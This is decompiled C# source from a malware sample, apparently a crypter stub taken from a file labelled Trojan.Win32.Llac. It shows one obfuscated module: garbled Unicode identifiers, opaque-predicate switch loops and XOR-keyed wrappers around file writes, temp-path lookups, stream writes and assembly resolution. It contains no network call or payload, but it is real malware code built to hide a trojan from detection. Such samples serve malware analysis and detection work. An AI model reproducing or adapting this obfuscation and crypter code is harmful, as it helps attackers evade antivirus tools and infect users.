// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴗ
// Assembly: Sk1dZ™ Crypter Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 765DE0A6-3ADE-4E57-B9F8-38E417A60863
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Llac.corb-c03a55dcfef9171c3c7a521e3f6aa3cd6873dbf8e0e0c6041a02f9ac6f9bd531.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sk1dZ__Crypter_Stub.My;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Configuration;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Ⴈ
{
  [StandardModule]
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
  [HideModuleName]
  internal sealed class Ⴗ
  {
    private static ResourceManager Ⴐ;
    private static CultureInfo Ⴈ;

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager Ⴓ
    {
      get
      {
label_3:
        int num = !Ⴈ.Ⴈ.Ⴍ((object) Ⴈ.Ⴗ.Ⴐ, (object) null, 344, 362) ? 1 : 7;
        ResourceManager resourceManager;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 4:
            case 6:
              goto label_3;
            case 1:
              goto label_7;
            case 3:
              num = 5;
              continue;
            case 5:
              Ⴈ.Ⴗ.Ⴐ = resourceManager;
              num = 1;
              continue;
            case 7:
              resourceManager = new ResourceManager("Ⴈ.Ⴗ", MyComputer.Ⴍ(Ⴈ.Ⴗ.Ⴅ(__typeref (Ⴈ.Ⴗ), 374, 284), 422, 477));
              goto case 3;
            default:
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.Ⴗ);
              num = 0;
              continue;
          }
        }
label_7:
        return Ⴈ.Ⴗ.Ⴐ;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo Ⴗ
    {
      get => Ⴈ.Ⴗ.Ⴈ;
      set => Ⴈ.Ⴗ.Ⴈ = value;
    }

    [SecuritySafeCritical]
    static Ⴗ() => Ⴈ.Ⴓ.ႣႼ();

    [SecuritySafeCritical]
    internal static object Ⴄ([In] object obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 91:
          num1 = 7;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_8;
          case 1:
          case 2:
            num2 = 3;
            continue;
          case 3:
            goto label_3;
          case 5:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.Ⴄ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return RuntimeHelpers.GetObjectValue(obj0);
    }

    [SecuritySafeCritical]
    internal static void Ⴀ([In] ApplicationSettingsBase obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_7;
          case 2:
          case 4:
          case 5:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 71:
                num2 = 0;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Save();
    }

    [SecuritySafeCritical]
    internal static void Ⴍ([In] object obj0, [In] ref bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_8;
          case 3:
            num1 = 2;
            continue;
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 28:
                num2 = 5;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      Monitor.Enter(obj0, ref obj1);
    }

    [SecuritySafeCritical]
    internal static System.Type Ⴅ([In] RuntimeTypeHandle obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 106:
          num1 = 7;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            num2 = 3;
            continue;
          case 1:
          case 6:
          case 7:
            goto label_8;
          case 2:
            num2 = 3;
            continue;
          case 3:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.Ⴅ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return System.Type.GetTypeFromHandle(obj0);
    }

    [SecuritySafeCritical]
    internal static void ႤႳ([In] Form obj0, [In] Size obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 3:
          case 4:
            num1 = 5;
            continue;
          case 2:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 31:
                num2 = 2;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.ClientSize = obj1;
    }

    [SecuritySafeCritical]
    internal static string ႤႤ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 38:
          num1 = 0;
          break;
        case 39:
          num1 = 8;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            goto label_9;
          case 2:
          case 7:
            num2 = 4;
            continue;
          case 3:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          case 5:
          case 8:
            goto label_10;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႤ);
            num2 = 4;
            continue;
        }
      }
label_9:
      return Path.GetTempPath();
label_10:
      return Application.ExecutablePath;
    }

    [SecuritySafeCritical]
    internal static long ႤႷ([In] int obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 47:
          num1 = 1;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 3;
            continue;
          case 1:
          case 2:
          case 4:
            goto label_8;
          case 3:
            goto label_3;
          case 7:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႷ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return FileSystem.LOF(obj0);
    }

    [SecuritySafeCritical]
    internal static string ႤႠ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 21:
          num1 = 6;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 2;
            continue;
          case 1:
          case 3:
          case 6:
            goto label_8;
          case 2:
            goto label_3;
          case 4:
          case 5:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႠ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0 + obj1;
    }

    [SecuritySafeCritical]
    internal static void ႤႨ([In] int obj0, [In] string obj1, [In] long obj2, [In] bool obj3, [In] int obj4, [In] int obj5)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
          case 5:
            goto label_7;
          case 1:
          case 4:
            num1 = 2;
            continue;
          default:
            int num2;
            switch (obj5 ^ obj4)
            {
              case 30:
                num2 = 0;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      FileSystem.FilePut(obj0, obj1, obj2, obj3);
    }

    [SecuritySafeCritical]
    internal static void ႤႰ([In] Form obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
          case 5:
            goto label_7;
          case 2:
            goto label_8;
          case 3:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 5:
                num2 = 4;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Close();
    }

    [SecuritySafeCritical]
    internal static XAttribute ႤႣ([In] XElement obj0, [In] XName obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 66:
          num1 = 1;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_8;
          case 2:
            num2 = 5;
            continue;
          case 3:
          case 7:
            num2 = 5;
            continue;
          case 5:
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႣ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.Attribute(obj1);
    }

    [SecuritySafeCritical]
    internal static string ႤႭ([In] XAttribute obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 93:
          num1 = 4;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 5:
            goto label_3;
          case 4:
            goto label_8;
          case 6:
            num2 = 5;
            continue;
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႭ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return (string) obj0;
    }

    [SecuritySafeCritical]
    internal static string ႤႥ([In] XNamespace obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 29:
          num1 = 4;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 6;
            continue;
          case 1:
            num2 = 6;
            continue;
          case 2:
          case 4:
          case 5:
            goto label_8;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႥ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.NamespaceName;
    }

    [SecuritySafeCritical]
    internal static Assembly ႤႼ([In] ResolveEventArgs obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 88:
          num1 = 1;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 3;
            continue;
          case 1:
          case 2:
            goto label_8;
          case 3:
            goto label_3;
          case 4:
          case 6:
          case 7:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႤႼ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0.RequestingAssembly;
    }

    [SecuritySafeCritical]
    internal static void ႷႳ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_7;
          case 2:
            goto label_8;
          case 3:
            goto label_9;
          case 4:
            num1 = 5;
            continue;
          default:
            int num2;
            switch (obj4 ^ obj3)
            {
              case 123:
                num2 = 1;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.SetData(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static long ႷႤ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 111:
          num1 = 0;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            goto label_8;
          case 3:
            num2 = 5;
            continue;
          case 4:
          case 5:
            goto label_3;
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႷႤ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.Length;
    }

    [SecuritySafeCritical]
    internal static void ႷႷ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 1:
          case 2:
            goto label_7;
          case 3:
          case 4:
            num1 = 5;
            continue;
          default:
            int num2;
            switch (obj5 ^ obj4)
            {
              case 55:
                num2 = 1;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Write(obj1, obj2, obj3);
    }

    [SecuritySafeCritical]
    internal static string ႷႠ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 102:
          num1 = 1;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 3:
          case 7:
            goto label_8;
          case 2:
          case 4:
            num2 = 0;
            continue;
          case 6:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴗ.ႷႠ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.Message;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴜ
    {
      internal IContainer Ⴄ;
    }
  }
}
